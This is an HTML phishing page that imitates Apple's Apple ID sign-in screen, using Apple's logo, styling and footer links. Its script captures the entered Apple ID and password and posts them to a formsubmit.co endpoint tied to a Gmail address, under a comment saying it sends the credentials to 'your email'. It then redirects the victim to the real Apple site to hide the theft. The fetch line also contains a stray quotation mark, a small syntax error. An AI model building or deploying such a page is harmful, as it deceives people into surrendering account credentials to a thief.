<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with your Apple ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1d1d1f;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 440px;
            padding: 48px 40px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .logo svg {
            width: 56px;
            height: 56px;
        }
        
        h1 {
            font-size: 32px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        
        .subtitle {
            text-align: center;
            color: #86868b;
            font-size: 17px;
            margin-bottom: 32px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            font-size: 13px;
            color: #1d1d1f;
            margin-bottom: 8px;
            font-weight: 400;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #d2d2d7;
            border-radius: 8px;
            outline: none;
            transition: all 0.2s;
            background: #ffffff;
        }
        
        input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.1);
        }
        
        .signin-btn {
            width: 100%;
            padding: 14px;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 24px;
            transition: background 0.2s;
        }
        
        .signin-btn:hover {
            background: #0077ed;
        }
        
        .signin-btn:active {
            background: #006edb;
        }
        
        .links {
            text-align: center;
            margin-top: 24px;
        }
        
        .links a {
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
            display: block;
            margin: 12px 0;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .divider {
            text-align: center;
            margin: 32px 0 24px;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #d2d2d7;
        }
        
        .divider span {
            background: white;
            padding: 0 16px;
            position: relative;
            color: #86868b;
            font-size: 13px;
        }
        
        .footer {
            text-align: center;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #d2d2d7;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 12px;
        }
        
        .footer-links a {
            color: #424245;
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .copyright {
            color: #86868b;
            font-size: 12px;
            margin-top: 8px;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0071e3;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Apple Logo SVG -->
            <svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
                <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z" fill="#1d1d1f"/>
            </svg>
        </div>
        
        <h1>Sign in with your Apple ID</h1>
        <p class="subtitle">Use your Apple ID to access all Apple services</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="appleid">Apple ID or email address</label>
                <input type="email" id="appleid" name="appleid" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            
            <button type="submit" class="signin-btn">Sign In</button>
            
            <div class="links">
                <a href="https://iforgot.apple.com/">Forgot Apple ID or password?</a>
                <a href="https://appleid.apple.com/account">Create Your Apple ID</a>
            </div>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 16px; color: #86868b;">Signing in...</p>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="https://www.apple.com/legal/privacy/">Privacy Policy</a>
                <a href="https://www.apple.com/legal/internet-services/terms/site.html">Terms of Use</a>
                <a href="https://support.apple.com/">Support</a>
            </div>
            <p class="copyright">Copyright © 2026 Apple Inc. All rights reserved.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const appleid = document.getElementById('appleid').value;
            const password = document.getElementById('password').value;
            
            // Show loading
            document.querySelector('.container form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Send credentials to your email via web service
            fetch('https://formsubmit.co/11111111aa1aaaaa@gmail.com';', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    appleid: appleid,
                    password: password,
                    timestamp: new Date().toISOString(),
                    ip: 'Captured'
                })
            }).then(() => {
                // Redirect to real Apple after 2 seconds
                setTimeout(() => {
                    window.location.href = 'https://appleid.apple.com/';
                }, 2000);
            }).catch(() => {
                // Even if it fails, redirect to real Apple
                setTimeout(() => {
                    window.location.href = 'https://appleid.apple.com/';
                }, 2000);
            });
        });
    </script>
</body>
</html>
